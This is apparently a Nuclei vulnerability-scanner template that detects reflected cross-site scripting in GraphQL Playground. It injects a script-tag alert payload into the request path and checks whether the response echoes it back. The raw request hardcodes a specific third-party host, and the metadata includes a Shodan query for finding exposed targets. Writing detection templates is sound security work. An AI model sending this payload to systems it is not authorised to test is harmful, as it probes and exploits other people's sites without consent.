id: graphql-reflected-xss

info:
  name: GraphQL Reflected XSS
  author: tess
  severity: unknown
  metadata:
    verified: true
    shodan-query: title:"GraphQL"
  tags: xss,graphql,misconfig

requests:
  - raw:
      - |+
        GET /graphql/;</script><script>alert(document.domain)</script> HTTP/1.1
        Host: bff.writing.test.cheggnet.com
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8


    unsafe: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '/graphql/;</script><script>alert(document.domain)</script>'
          - 'GraphQLPlayground.init(root'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
